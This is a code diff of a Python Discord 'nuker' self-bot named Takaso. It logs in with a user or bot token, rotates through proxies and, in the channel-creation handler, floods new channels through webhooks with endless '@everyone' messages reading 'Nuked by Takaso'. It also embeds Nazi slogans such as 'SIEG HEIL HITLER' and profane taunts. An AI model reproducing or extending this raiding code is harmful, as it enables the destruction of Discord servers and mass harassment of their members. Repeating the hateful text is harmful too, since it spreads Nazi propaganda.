@@ -1,4 +1,4 @@
-    
+     
 import os
 # Hello, if you came here, I don't know how you find this repl
 # But don't fork this project nor skid it, if you do you're a fucking skidlord
@@ -21,6 +21,17 @@ import base64
 from webserver import keep_alive
 
 
+
+
+usertoken = input("Insert the token: ")
+
+prefix = "%"
+
+checkweb = False
+proxies = proxygen.get_proxies()
+proxy_pool = cycle(proxies)
+proxy = next(proxy_pool)
+
 cursed_text = """"
 Sub to -> https://www.youtube.com/watch?v=npWrCJYrAfo
 
@@ -35,23 +46,20 @@ SIEG HEIL HITLER
 """
 
 
-default_token = os.environ['defeault_token']
-usertoken = input("Insert your token > ")
-if usertoken == "cazzo":
-  usertoken = default_token
+def check_token():
+    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": usertoken}).status_code == 200:
+        return "y"
+    else:
+        return "n"
 
-prefix = "%"
+account_type = "y"
 
 Answers = ["Yes", "ye", "yes", "YeS", "YEs", "YES", "yEs", "yeS", "yeah", "Yeah", "Yep", "yep", "YE", "Ye", "yE", "y", "Y"]
 
-account_type = input("\n%s[!] Warning [!]%s\n%sAre you using an account token?%s %sYes/No%s > " % (yellow(), reset(), magenta(), reset(), green(), reset()))
-
-
-replit.clear()
-
-if account_type in Answers:
+if account_type == check_token():
     try:
         slayer = commands.Bot(prefix, self_bot=True)
+        slayer.remove_command("help")
         headers = {
           "Authorization": usertoken
           }
@@ -59,26 +67,23 @@ if account_type in Answers:
       pass
 else:
     try:
-        intenzioni = input("\n%s[!]%s You have choosen a bot account, do you want the %sintents%s to be %senabled%s? Yes/No > " % (yellow(), reset(), red(), reset(), green(), reset()))
+        intenzioni = input("\n%s[!]%s You're using a bot account, do you want the %sintents%s to be %senabled%s? Yes/No > " % (yellow(), reset(), red(), reset(), green(), reset()))
         if intenzioni in Answers:
             intents = discord.Intents().all()
             slayer = commands.Bot(prefix, intents=intents)
+            slayer.remove_command("help")
             headers = {
                 "authorization": f"Bot {usertoken}"
                 }
         else:
             slayer = commands.Bot(prefix)
+            slayer.remove_command("help")
             headers = {
                 "authorization": f"Bot {usertoken}"
                 }
     except:
-        pass 
+        pass
 
-
-checkweb = False
-proxies = proxygen.get_proxies()
-proxy_pool = cycle(proxies)
-proxy = next(proxy_pool)
 
 @slayer.event
 async def on_ready():
@@ -443,7 +448,7 @@ async def on_guild_channel_create(channel):
       webhook = await channel.create_webhook(name="Takaso")
       try:
           while True:
-              await webhook.send(content=" > Nuked by **Takaso**\n```py\n'Imagine having your surver fucked.'\n```\nhttps://www.youtube.com/channel/UCdYfkF4FrJIbOWpto0H4fyA\n > **HEIL TAKASO**\n@everyone")
+              await webhook.send(content=" > Nuked by **Takaso**\n```py\n'Imagine having your surver fucked.'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
       except:
           pass
 
